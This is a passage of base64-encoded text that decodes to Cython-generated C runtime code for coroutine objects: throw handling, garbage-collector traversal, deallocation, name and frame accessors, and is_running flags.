AgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgICAgICB8fCBfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHlmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpO1xuICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfX0Nvcm91dGluZV9UaHJvdygoKF9fcHl4X0Nvcm91dGluZUF3YWl0T2JqZWN0Kil5ZiktPmNvcm91dGluZSwgdHlwLCB2YWwsIHRiLCBhcmdzLCBjbG9zZV9vbl9nZW5leGl0KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyb3cpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRoKSkge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChsaWtlbHkoYXJncykpIHtcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKG1ldGgsIGFyZ3MsIE5VTEwpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2FyZ3NbNF0gPSB7TlVMTCwgdHlwLCB2YWwsIHRifTtcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChtZXRoLCBjYXJncysxLCAzIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgICAgICBpZiAocmV0KSB7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICAgICAgcmV0dXJuIHJldDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sICZyZXQpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXQsIDApO1xuICAgIH1cbnRocm93X2hlcmU6XG4gICAgX19QeXhfUmFpc2UodHlwLCB2YWwsIHRiLCBOVUxMKTtcbnByb3BhZ2F0ZV9leGNlcHRpb246XG4gICAge1xuICAgICAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBOVUxMLCAmcmV0dmFsLCAwKTtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0dmFsLCAwKTtcbiAgICB9XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZ3MpIHtcbiAgICBQeU9iamVjdCAqdHlwO1xuICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICp0YiA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KCFQeUFyZ19VbnBhY2tUdXBsZShhcmdzLCAidGhyb3ciLCAxLCAzLCAmdHlwLCAmdmFsLCAmdGIpKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfVGhyb3coc2VsZiwgdHlwLCB2YWwsIHRiLCBhcmdzLCAxKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4jZWxzZVxuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3R5cGUpO1xuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuI2VuZGlmXG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHtcbiAgICB7XG4gICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopZ2VuLCAxLCB2aXNpdCwgYXJnKTtcbiAgICAgICAgaWYgKGUpIHJldHVybiBlO1xuICAgIH1cbiAgICBQeV9WSVNJVChnZW4tPmNsb3N1cmUpO1xuICAgIFB5X1ZJU0lUKGdlbi0+Y2xhc3NvYmopO1xuICAgIFB5X1ZJU0lUKGdlbi0+eWllbGRmcm9tKTtcbiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlX2V4Y3N0YXRlKCZnZW4tPmdpX2V4Y19zdGF0ZSwgdmlzaXQsIGFyZyk7XG59XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZikge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5X0NMRUFSKGdlbi0+Y2xvc3VyZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5jbGFzc29iaik7XG4gICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJmdlbi0+Z2lfZXhjX3N0YXRlKTtcbiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilnZW4pLT5hZ19maW5hbGl6ZXIpO1xuICAgIH1cbiNlbmRpZlxuICAgIFB5X0NMRUFSKGdlbi0+Z2lfY29kZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9mcmFtZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9uYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX3F1YWxuYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX21vZHVsZW5hbWUpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX2RlYWxsb2MoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBQeU9iamVjdF9HQ19VblRyYWNrKGdlbik7XG4gICAgaWYgKGdlbi0+Z2lfd2Vha3JlZmxpc3QgIT0gTlVMTClcbiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcyhzZWxmKTtcbiAgICBpZiAoZ2VuLT5yZXN1bWVfbGFiZWwgPj0gMCkge1xuICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhzZWxmKTtcbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2Moc2VsZikpKVxuI2Vsc2VcbiAgICAgICAge1xuICAgICAgICAgICAgZGVzdHJ1Y3RvciBkZWwgPSBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGdlbiwgdHBfZGVsLCBkZXN0cnVjdG9yKTtcbiAgICAgICAgICAgIGlmIChkZWwpIGRlbChzZWxmKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoUHlfUkVGQ05UKHNlbGYpID4gMCkpXG4jZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7XG4gICAgfVxuI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkge1xuICAgICAgICBcbiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmKS0+YWdfZmluYWxpemVyKTtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoc2VsZik7XG4gICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwoZ2VuKTtcbn1cbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfZGVsKFB5T2JqZWN0ICpzZWxmKSB7XG4gICAgUHlPYmplY3QgKmVycm9yX3R5cGUsICplcnJvcl92YWx1ZSwgKmVycm9yX3RyYWNlYmFjaztcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBpZiAoZ2VuLT5yZXN1bWVfbGFiZWwgPCAwKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FcnJGZXRjaCgmZXJyb3JfdHlwZSwgJmVycm9yX3ZhbHVlLCAmZXJyb3JfdHJhY2ViYWNrKTtcbiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgX19weXhfUHlBc3luY0dlbk9iamVjdCAqYWdlbiA9IChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmO1xuICAgICAgICBQeU9iamVjdCAqZmluYWxpemVyID0gYWdlbi0+YWdfZmluYWxpemVyO1xuICAgICAgICBpZiAoZmluYWxpemVyICYmICFhZ2VuLT5hZ19jbG9zZWQpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGZpbmFsaXplciwgc2VsZik7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXJlcykpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgIH1cbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShnZW4tPnJlc3VtZV9sYWJlbCA9PSAwICYmICFlcnJvcl92YWx1ZSkpIHtcbiNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgaWYgKCFfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdChzZWxmKSlcbiNlbmRpZlxuICAgICAgICB7XG4gICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7XG4gICAgICAgIGlmICh1bmxpa2VseShQeUVycl9XYXJuRm9ybWF0KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAxLCAiY29yb3V0aW5lIFwnJS41MFNcJyB3YXMgbmV2ZXIgYXdhaXRlZCIsIGdlbi0+Z2lfcXVhbG5hbWUpIDwgMCkpXG4gICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKHNlbGYpO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTtcbiAgICAgICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikge1xuICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfWERFQ1JFRihyZXR2YWwpO1xuICAgICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X25hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTtcbiAgICBQeV9JTkNSRUYobmFtZSk7XG4gICAgcmV0dXJuIG5hbWU7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9Db3JvdXRpbmVfc2V0X25hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChzZWxmLT5naV9uYW1lLCB2YWx1ZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ29yb3V0aW5lX2dldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgUHlPYmplY3QgKm5hbWUgPSBzZWxmLT5naV9xdWFsbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTtcbiAgICBQeV9JTkNSRUYobmFtZSk7XG4gICAgcmV0dXJuIG5hbWU7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9Db3JvdXRpbmVfc2V0X3F1YWxuYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fcXVhbG5hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX3F1YWxuYW1lLCB2YWx1ZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmKVxue1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZyYW1lO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihzZWxmKTtcbiAgICAjZW5kaWZcbiAgICBmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lO1xuICAgIGlmICghZnJhbWUpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmLT5naV9jb2RlKSkge1xuICAgICAgICAgICAgUHlfUkVUVVJOX05PTkU7XG4gICAgICAgIH1cbiAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZ2xvYmFscykpIHJldHVybiBOVUxMO1xuICAgICAgICBmcmFtZSA9IChQeU9iamVjdCAqKSBQeUZyYW1lX05ldyhcbiAgICAgICAgICAgIFB5VGhyZWFkU3RhdGVfR2V0KCksICAgICAgICAgICAgXG4gICAgICAgICAgICAoUHlDb2RlT2JqZWN0Kikgc2VsZi0+Z2lfY29kZSwgIFxuICAgICAgICAgICAgZ2xvYmFscywgICAgICAgICAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICk7XG4gICAgICAgIFB5X0RFQ1JFRihnbG9iYWxzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFmcmFtZSkpXG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgaWYgKHVubGlrZWx5KHNlbGYtPmdpX2ZyYW1lKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGZyYW1lKTtcbiAgICAgICAgICAgIGZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzZWxmLT5naV9mcmFtZSA9IGZyYW1lO1xuICAgICAgICB9XG4gICAgfVxuICAgIFB5X0lOQ1JFRihmcmFtZSk7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiBmcmFtZTtcbiNlbHNlXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoc2VsZik7XG4gICAgUHlfUkVUVVJOX05PTkU7XG4jZW5kaWZcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5T2JqZWN0ICpmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lO1xuICAgIGlmIChmcmFtZSlcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmcmFtZSk7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfZ2V0X2ZyYW1lKHNlbGYpO1xufVxuc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoXG4gICAgICAgICAgICBQeVR5cGVPYmplY3QqIHR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBQeU9iamVjdF9HQ19OZXcoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB0eXBlKTtcbiAgICBpZiAodW5saWtlbHkoIWdlbikpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoZ2VuLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpO1xufVxuc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KFxuICAgICAgICAgICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7XG4gICAgZ2VuLT5ib2R5ID0gYm9keTtcbiAgICBnZW4tPmNsb3N1cmUgPSBjbG9zdXJlO1xuICAgIFB5X1hJTkNSRUYoY2xvc3VyZSk7XG4gICAgZ2VuLT5pc19ydW5uaW5nID0gMDtcbiAgICBnZW4tPnJlc3VtZV9sYWJlbCA9IDA7XG4gICAgZ2VuLT5jbGFzc29iaiA9IE5VTEw7XG4gICAgZ2VuLT55aWVsZGZyb20gPSBOVUxMO1xuICAgIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQgPSBOVUxMO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDtcbiAgICAjZWxzZVxuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlID0gTlVMTDtcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSBOVUxMO1xuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMO1xuICAgICNlbmRpZlxuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5wcmV2aW91c19pdGVtID0gTlVMTDtcbiNlbmRpZlxuICAgIGdlbi0+Z2lfd2Vha3JlZmxpc3QgPSBOVUxMO1xuICAgIFB5X1hJTkNSRUYocXVhbG5hbWUpO1xuICAgIGdlbi0+Z2lfcXVhbG5hbWUgPSBxdWFsbmFtZTtcbiAgICBQeV9YSU5DUkVGKG5hbWUpO1xuICAgIGdlbi0+Z2lfbmFtZSA9IG5hbWU7XG4gICAgUHlfWElOQ1JFRihtb2R1bGVfbmFtZSk7XG4gICAgZ2VuLT5naV9tb2R1bGVuYW1lID0gbW9kdWxlX25hbWU7XG4gICAgUHlfWElOQ1JFRihjb2RlKTtcbiAgICBnZW4tPmdpX2NvZGUgPSBjb2RlO1xuICAgIGdlbi0+Z2lfZnJhbWUgPSBOVUxMO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKGdlbik7XG4gICAgcmV0dXJuIGdlbjtcbn1cbnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikge1xuICAgIGNoYXIgcmVzdWx0O1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pO1xuICAgICNlbmRpZlxuICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZztcbiAgICBnZW4tPmlzX3J1bm5pbmcgPSAxO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTtcbiAgICAjZW5kaWZcbiAgICBhc3NlcnQoZ2VuLT5pc19ydW5uaW5nKTtcbiAgICBnZW4tPmlzX3J1bm5pbmcgPSAwO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICAjZW5kaWZcbn1cbnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikge1xuICAgIGNoYXIgcmVzdWx0O1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pO1xuICAgICNlbmRpZlxuICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZztcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlcihQeU9iamVjdCAqZ2VuLCB2b2lkICpjbG9zdXJlKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY2xvc3VyZSk7XG4gICAgY2hhciByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoKF9fcHl4X0Nvcm91dGluZU9iamVjdCopZ2VuKTtcbiAgICBpZiAocmVzdWx0KSBQeV9SRVRVUk5fVFJVRTtcbiAgICBlbHNlIFB5X1JFVFVSTl9GQUxTRTtcbn